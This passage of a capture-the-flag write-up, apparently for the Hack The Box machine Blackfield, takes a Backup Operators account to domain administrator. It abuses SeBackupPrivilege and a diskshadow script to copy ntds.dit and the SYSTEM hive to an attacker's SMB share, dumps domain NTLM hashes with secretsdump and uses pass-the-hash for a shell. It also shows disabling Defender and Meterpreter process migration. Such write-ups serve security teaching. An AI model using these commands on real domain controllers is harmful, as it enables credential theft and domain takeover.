Now I can read files across the filesystem. For example, I can’t read `C:\windows\system32\config\netlogon.dns` as a non-admin user:

```
*Evil-WinRM* PS C:\windows\system32\config> type netlogon.dns              
Access to the path 'C:\windows\system32\config\netlogon.dns' is denied.    
At line:1 char:1                                                                                                     
+ type netlogon.dns                                                                                                                                                                                                                        
+ ~~~~~~~~~~~~~~~~~                                                                                                  
    + CategoryInfo          : PermissionDenied: (C:\windows\system32\config\netlogon.dns:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand 

```

But I can copy it and read it:

```
*Evil-WinRM* PS C:\windows\system32\config> Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns
*Evil-WinRM* PS C:\windows\system32\config> type \programdata\netlogon.dns
2a754031-e5c5-4e88-bb09-09aae693753c._msdcs.BLACKFIELD.local. 600 IN CNAME DC01.BLACKFIELD.local.
_ldap._tcp.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.Default-First-Site-Name._sites.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.pdc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.gc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 3268 dc01.blackfield.local.
_ldap._tcp.Default-First-Site-Name._sites.gc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 3268 dc01.blackfield.local.
...[snip]...

```

Unfortunately, for some reason, I can’t read `root.txt`:

```
*Evil-WinRM* PS C:\programdata> Copy-FileSeBackupPrivilege \users\administrator\desktop\root.txt 0xdf.txt
Opening input file. - Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
At line:1 char:1
+ Copy-FileSeBackupPrivilege \users\administrator\desktop\root.txt 0xdf ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception
    + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege

```

The next file I wanted to grab was `ntds.dit`, the database on the DC that holds all the password hashes. Unfortunately, I can’t grab it because it’s in use:

```
*Evil-WinRM* PS C:\programdata> Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
Opening input file. - The process cannot access the file because it is being used by another process. (Exception from HRESULT: 0x80070020)
At line:1 char:1
+ Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception
    + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege

```

### DiskShadow

#### Background / Strategy

A good way to read the `ntds.dit` file is using [another Microsoft utility](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow), `diskshadow`:

> Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS). By default, Diskshadow uses an interactive command interpreter similar to that of Diskraid or Diskpart. Diskshadow also includes a scriptable mode.

Because my shell is not an interactive desktop, I’ll want to use the scripting mode. It involves just putting `diskshadow` commands in a file, one per line. Pentestlab Blog has a [good breakdown](https://pentestlab.blog/tag/diskshadow/) that includes a section on using `diskshadow`. It’s written as if you have admin and just have to deal with accessing the file, so my strategy will be slightly different.

I’m going to create a file that mounts the c drive as another drive using the VSS. I’ll be able to read files from there that would be locked in c.

#### Troubleshooting

It took me a few attempts to get this to actually work. I’ll walk through them for anyone who might find it useful to see how I troubleshoot. Or, you can skip to the next section.

I started with the script from the [PentestLab blog](https://pentestlab.blog/tag/diskshadow/):

```

set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset

```

It is going to fail at that `copy`, so I’ll cut that out and let it stop after mounting the shadow copy. I updated the path I wanted to copy it to, and the alias, and had:

```

set context persistent nowriters
add volume c: alias df
create
expose %df% z:

```

I’ll upload that and run it. The article recommended running out of C:\windows\system32:

```
*Evil-WinRM* PS C:\windows\system32> upload vss.dsh c:\programdata\vss.dsh
Info: Uploading vss.dsh to c:\programdata\vss.dsh

Data: 104 bytes of 104 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\windows\system32> diskshadow /s c:\programdata\vss.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  6/9/2020 8:49:56 PM
-> set context persistent nowriter

SET CONTEXT { CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] }

        CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.
        PERSISTENT              Specify that shadow copy is persist across program exit, reset or reboot.
        PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.
        VOLATILE                Specify that shadow copy will be deleted on exit or reset.
        VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.

        Example: SET CONTEXT CLIENTACCESSIBLE

```

It took me a few minutes to catch the error here. It’s breaking on the first line. Eventually I noticed that it was failing on the line ending with `nowriter`, but my input ended with `nowriters` (notice the `s`). That got me thinking it might have to do with endlines. I ran `unix2dos` on my local host and uploaded it again.

```

root@kali# unix2dos vss.dsh 
unix2dos: converting file vss.dsh to DOS format...

```

Now I’ll upload and run:

```
*Evil-WinRM* PS C:\windows\system32> upload vss.dsh c:\programdata\vss.dsh
Info: Uploading vss.dsh to c:\programdata\vss.dsh

Data: 108 bytes of 108 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\windows\system32> diskshadow /s c:\programdata\vss.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  6/9/2020 9:05:54 PM
-> set context persistent nowriters
-> add volume c: alias df
-> create
Alias df for shadow ID {6e34c6ee-0d9d-4d6a-bebb-d3a576e30542} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {5d0763c6-f22d-4338-87b2-96e7251a097e} set as environment variable.
Could not create .cab metadata file. If the metadata file name was specified using
SET METADATA, the file or directory path name may not be valid.

```

The error message is complaining that it can’t create the `.cab` file. It’s probably trying to do so in the local directory. I noticed in the examples in the [Microsoft documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) that it used a line to set the `metadata` location. I’ll add that line, and another from the examples to turn verbose on (because why not):

```

set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:

```

I could also have just started running out of a writable directory, like `programdata`.

After `unix2dos`, upload and run, and it works:

```
*Evil-WinRM* PS C:\windows\system32> diskshadow /s c:\programdata\vss.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  6/9/2020 9:15:49 PM
-> set context persistent nowriters
-> set metadata c:\programdata\df.cab
-> set verbose on
-> add volume c: alias df
-> create

Alias df for shadow ID {fe96248c-9468-4892-befc-a9ac2dda6a8e} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {e5573ff3-af32-4b6e-961a-8db9a3e76625} set as environment variable.
Inserted file Manifest.xml into .cab file df.cab
Inserted file Dis6354.tmp into .cab file df.cab

Querying all shadow copies with the shadow copy set ID {e5573ff3-af32-4b6e-961a-8db9a3e76625}
        * Shadow copy ID = {fe96248c-9468-4892-befc-a9ac2dda6a8e}               %df%
                - Shadow copy set: {e5573ff3-af32-4b6e-961a-8db9a3e76625}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 6/9/2020 9:15:50 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %df% z:
-> %df% = {fe96248c-9468-4892-befc-a9ac2dda6a8e}
The shadow copy was successfully exposed as z:\.
->

```

#### Success

In summary, to get this script working, I needed to
- Make sure the input script file uses Windows line endings. If I write the script file on Kali, I’ll need to use `unix2dos` on it before uploading.
- Set the metadata path to something writable, or run from a directory I can write to or set the metadata path.
- Some quick testing shows it is fine to run from outside `system32` despite what the blog post said.

The working script is:

```

set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:

```

I wrote another to clean up after I’m done:

```

set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
delete shadows volume df
reset

```

### Grab ntds.dit

I’ll start an SMB server locally on my host so that I can copy the `ntds.dit` file directly there with `smbserver.py s . -smb2support -username df -password df`. Now I can auth to the share:

```
*Evil-WinRM* PS C:\programdata> net use \\10.10.14.14\s /u:df df
The command completed successfully.

```

Now, after running the script to expose the shadow copy, I’ll copy `ntds.dit` to the share:

```
*Evil-WinRM* PS C:\programdata> Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.14\s\ntds.dit

```

It takes a minute, but it succeeds.

To get hashes out of this, I’ll also need the keys from the `SYSTEM` registry file. I’ll save it with `reg`:

```
*Evil-WinRM* PS C:\programdata> reg.exe save hklm\system \\10.10.14.14\system

```

I’ll run my clean up script to close the z: drive.

### Dump Hashes

Now I can use these two files to dump hashes for the full domain using `secretsdump.py`:

```

root@kali# secretsdump.py -system system -ntds ntds.dit LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD937395:1110:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD553715:1111:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
...[snip]...

```

### Shell

Armed with the administrator’s hash, I can use Evil-WinRM to get a shell:

```

root@kali# evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And get `root.txt`:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
4375a629************************

```

## Beyond Root - EFS

### Identify Protection

I wanted to see why the Backup Operator script didn’t allow me access to `root.txt`. My first guess was some kind of [DACL](https://docs.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces) blocking svc\_backup from reading, but `icacls` didn’t show anything like that:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> icacls root.txt
root.txt BLACKFIELD\Administrator:(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         BUILTIN\Administrators:(I)(F)
         BLACKFIELD\Administrator:(I)(F)

```

It turns out to be [encrypted file system](https://en.wikipedia.org/wiki/Encrypting_File_System) (EFS). I used EFS on all the flags and files of interest in [RE](/2020/02/01/htb-re.html#read-roottxt-as-system), largely because if there was an unintended path that led to system (which there turned out to be), I wanted to make it as hard as possible. Typically I’d run `cipher /c [file]` to see if the file is encrypted and who can decrypt it:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> cipher /c root.txt

 Listing C:\Users\Administrator\desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows Vista/Server 2008

cipher.exe : Access is denied.
    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Access is denied.
  Key information cannot be retrieved.

Access is denied.

```

It is encrypted (`E root.txt`), but it crashes before I can see who can decrypt.

There’s also an interesting script in the administrator’s `documents` folder:

```
*Evil-WinRM* PS C:\Users\Administrator\documents> dir

    Directory: C:\Users\Administrator\documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/23/2020   5:03 AM                forensic
-a----        5/28/2020  10:08 AM            404 watcher.ps1

```

`watcher.ps1` runs in an endless loop. First, it records the last write time on `root.txt`. Then it enters the loop, and if the last write time ever changes, it then updates the last write time (so that it won’t trigger again unless there’s another write) *and* encrypts the file:

```

$file = "C:\Users\Administrator\Desktop\root.txt"
$command = "(Get-Item -Path $file).Encrypt()"

$this_time = (get-item $file).LastWriteTime
$last_time = $this_time
while($true) {
    if ($last_time -ne $this_time) {
        $last_time = $this_time
        Invoke-Command -ComputerName LOCALHOST -ScriptBlock { $command }
    }
    sleep 1
    $this_time = (get-item $file).LastWriteTime
}

```

When I wrote RE, I just submitted the VM with EFS encrypted files in it. I suspect now that there’s a flag rotation system at HTB, creators can’t do that. Instead, when the outside system replaces the flag, it can’t do that encrypted with the keys from the local administrator. So instead, it drops it encrypted, and one second later, this script encrypts it.

Looking at the scheduled tasks, there’s one called `Watcher`. It starts on boot and runs `watcher.ps1`:

```
*Evil-WinRM* PS C:\Users\Administrator\documents> Get-ScheduledTask -taskname Watcher | fl TaskName,Triggers

TaskName : Watcher
Triggers : {MSFT_TaskBootTrigger}
*Evil-WinRM* PS C:\Users\Administrator\documents> (Get-ScheduledTask -taskname Watcher).actions | fl Execute,Arguments

Execute   : C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
Arguments : -ep bypass C:\Users\Administrator\Documents\watcher.ps1

```

### Session Rabbit Hole

I was a bit confused as to why `cipher` wasn’t able to tell me which users could decrypt the file. In chatting with someone about it, they suggested that it might have to do with which session my process was in. Running `tasklist` shows each process and includes by default the session for the process:

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> tasklist                  

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0        144 K
Registry                        88 Services                   0     76,028 K
smss.exe                       280 Services                   0      1,180 K
csrss.exe                      388 Services                   0      5,328 K
wininit.exe                    464 Services                   0      6,596 K
csrss.exe                      472 Console                    1      4,848 K
winlogon.exe                   528 Console                    1     67,992 K
services.exe                   604 Services                   0     13,448 K
lsass.exe                      612 Services                   0     66,152 K
svchost.exe                    816 Services                   0      3,688 K
fontdrvhost.exe                836 Console                    1      5,388 K
fontdrvhost.exe                844 Services                   0      4,392 K
svchost.exe                    852 Services                   0     22,084 K
svchost.exe                    940 Services                   0     11,824 K
svchost.exe                    988 Services                   0      9,636 K
dwm.exe                        328 Console                    1     58,908 K
svchost.exe                    456 Services                   0     12,296 K
...[snip]...

```

Session 0 is Services, and session 1 is Console. When I connect with WinRM, it creates a `wsmprovhost.exe` process, which runs in session 0:

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> tasklist | findstr wsmprovhost
wsmprovhost.exe               5324 Services                   0     85,644 K
wsmprovhost.exe               5696 Services                   0    129,840 K
wsmprovhost.exe               1776 Services                   0     70,056 K

```

I disabled defender, and got a Meterpreter shell (I used `exploit/multi/script/web_delivery`, but there are a lot of ways) and migrated to a process in session 1, `winlogon.exe`:

```

meterpreter > getuid
Server username: BLACKFIELD\Administrator
meterpreter > migrate 528
[*] Migrating from 2268 to 528...
[*] Migration completed successfully.

```

Now I dropped to a shell and ran `cipher` again:

```

C:\Users\Administrator\Desktop>cipher /c root.txt

 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    BLACKFIELD\Administrator [Administrator(Administrator@BLACKFIELD)]
    Certificate thumbprint: 327F 9775 6FF7 110B 0564 E159 7DBC AF6E 7D2A AFD8 

  Recovery Certificates:
    BLACKFIELD\Administrator [Administrator(Administrator@BLACKFIELD)]
    Certificate thumbprint: 78CD 0031 7A9C 948A 9A66 0D6D BC32 0706 D193 476A 

  Key information cannot be retrieved.

The specified file could not be decrypted.

C:\Users\Administrator\Desktop>type root.txt
Access is denied.

```

I can see who can decrypt (administrator, as expected), but now I can’t decrypt it. Of course, because I’m running as SYSTEM:

```

C:\Users\Administrator\Desktop>whoami
nt authority\system

```

I got a new Meterpreter session, and this time, I looked for a process that was running as administrator and was in session 1:

```

meterpreter > ps

Process List
============

 PID   PPID  Name                                       Arch  Session  User                          Path
 ---   ----  ----                                       ----  -------  ----                          ----
 0     0     [System Process]                                                                         
 4     0     System                                     x64   0                                      
 88    4     Registry                                   x64   0                                      
 280   4     smss.exe                                   x64   0                                      
 328   528   dwm.exe                                    x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
...[snip]...
 5848  604   svchost.exe                                x64   1        BLACKFIELD\Administrator      C:\Windows\System32\svchost.exe
...[snip]...

meterpreter > migrate 5848
[*] Migrating from 4504 to 5848...
[*] Migration completed successfully.

```

Now in a shell, and `cipher` works and I can read the flag:

```

C:\Users\Administrator\Desktop>cipher /c root.txt

 Listing C:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    BLACKFIELD\Administrator [Administrator(Administrator@BLACKFIELD)]
    Certificate thumbprint: 327F 9775 6FF7 110B 0564 E159 7DBC AF6E 7D2A AFD8 

  Recovery Certificates:
    BLACKFIELD\Administrator [Administrator(Administrator@BLACKFIELD)]
    Certificate thumbprint: 78CD 0031 7A9C 948A 9A66 0D6D BC32 0706 D193 476A 

  Key Information:
    Algorithm: AES
    Key Length: 256
    Key Entropy: 256
    
C:\Users\Administrator\Desktop>type root.txt
4375a629************************

```